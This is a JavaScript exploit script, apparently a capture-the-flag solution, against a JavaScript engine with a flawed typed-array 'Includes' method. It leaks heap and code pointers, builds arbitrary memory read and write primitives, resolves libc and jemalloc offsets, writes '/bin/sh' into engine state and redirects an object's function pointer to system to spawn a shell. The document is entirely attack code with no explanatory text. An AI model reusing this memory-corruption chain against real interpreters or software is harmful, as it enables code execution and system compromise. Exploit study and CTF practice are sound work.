test = new ArrayBuffer(0x70);
a = new Uint16Array(0x20);
b = new Uint16Array(test);

vals = new Array(0x70);
for(i = 0; i < 65535; i++) {
    j = b.Includes(i);
    if(j){
        vals[j] = i;
    }
}

function leak(vals, off){
    return vals[off] + (vals[off+1]*0x10000) + (vals[off+2]*0x100000000);
}

heap_leak = leak(vals, 0x44)
code_leak = leak(vals, 0x3c)

print(heap_leak)
print(code_leak)

offset = 0x48

vals2 = new Array(0x10);
function read(addr){
    addr = addr - 2;
    b.set(offset, addr % 0x10000);
    b.set(offset + 1, (addr / 0x10000) % 0x10000);
    b.set(offset + 2, addr / 0x100000000);
    for(i = 0; i < 65535; i++) {
        j = a.Includes(i);
        if(j){
            vals2[j] = i;
        }
    }
    return leak(vals2, 1);
}

function write(addr, value){
    b.set(offset, addr % 0x10000);
    b.set(offset + 1, (addr / 0x10000) % 0x10000);
    b.set(offset + 2, addr / 0x100000000);
    a.set(0, value % 0x10000);
    a.set(1, (value / 0x10000) % 0x10000);
    a.set(2, (value / 0x100000000) % 0x100000000);
}

libc_base = read(code_leak - 0x290) - 0x18cba0;
libjemalloc_base = read(code_leak - 0x290 - 0x28) - 0x1ab10;

print(libc_base)

one_gadget = libc_base + 0xe6c81;
environ = libc_base + 0x1ef2e0;

malloc_hook = libjemalloc_base + 0xb6280;
realloc_hook = malloc_hook - 8;
free_hook = malloc_hook + 8;
system = libc_base + 0x55410;
array_obj = heap_leak + 0x2760;
print(array_obj);

//js_state = heap_leak - 0x10160;
stack = read(environ) - 0x188;
print(stack)
js_state = read(stack);
print(js_state);

binsh1 = 0x732f6e69622f
binsh2 = 0x68

write(js_state, binsh1);
print("write1 done");
write(js_state + 6, binsh2);
print("write2 done");
write(array_obj + 0x30, system);
print("write3 done");
a = new Array(0);
